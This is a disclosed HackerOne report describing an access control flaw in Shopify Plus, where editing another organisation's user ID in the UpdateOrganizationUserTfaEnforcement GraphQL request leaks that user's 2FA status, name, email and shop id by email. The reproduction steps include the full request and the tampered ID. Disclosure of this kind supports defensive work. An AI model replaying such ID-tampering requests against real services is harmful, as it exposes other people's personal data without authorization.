# [h1-2102] Improper Access Control at https://shopify.plus/[id]/users/api in operation UpdateOrganizationUserTfaEnforcement

## Report Details
- **Report ID**: 1085042
- **URL**: https://hackerone.com/reports/1085042
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-01-23T03:33:14.754Z
- **Disclosed**: 2022-07-11T21:15:54.522Z

## Reporter
- **Username**: ramsexy
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
## Summary:
There is an access control issue that happens when a Shopify Plus user tries to update the 2FA requirement of a user in another organisation. While the response shows an error message, an email is sent to the user with the 2FA status, first name, last name, email address, and shop id from the victim.

## Steps To Reproduce:
1. Log in to your Shopify Plus account https://shopify.plus/login
2. Go to `Administration` -> `Users` then go in one of the user page
3. In the `Security` section, edit the 2FA setting

    {F1168658}
4. Notice the following request:
    ```http
POST /34808573/users/api HTTP/1.1
Host: shopify.plus
 [...]

    {
        "operationName": "UpdateOrganizationUserTfaEnforcement",
        "variables": {
            "id": "Z2lkOi8vb3JnYW5pemF0aW9uL09yZ2FuaXphdGlvblVzZXIvMzQwNTc5Mzg=",
            "enforced": false
        },
        "query": "mutation UpdateOrganizationUserTfaEnforcement($id: OrganizationUserID!, $enforced: Boolean!) {\n  updateOrganizationUserTfaEnforcement(id: $id, enforced: $enforced) {\n    organizationUser {\n      id\n      tfaEnforced\n      __typename\n    }\n    userErrors {\n      field\n      message\n      __typename\n    }\n    operationStatus\n    message\n    __typename\n  }\n}\n"
    }
```
5. In Burp Repeater, edit the `id` with `Z2lkOi8vb3JnYW5pemF0aW9uL09yZ2FuaXphdGlvblVzZXIvMzQwNzE2MzI=`
6. You will receive an email containing Anatoly information :
{F1168661}

## Impact

A Shopify Plus user can retrieve information (2FA status, first name, last name, email address, shop ip) from a user in another organisation.

## Attachments
- Screen_Shot_2021-01-22_at_10.19.06_PM.png
- Screen_Shot_2021-01-22_at_10.08.14_PM.png
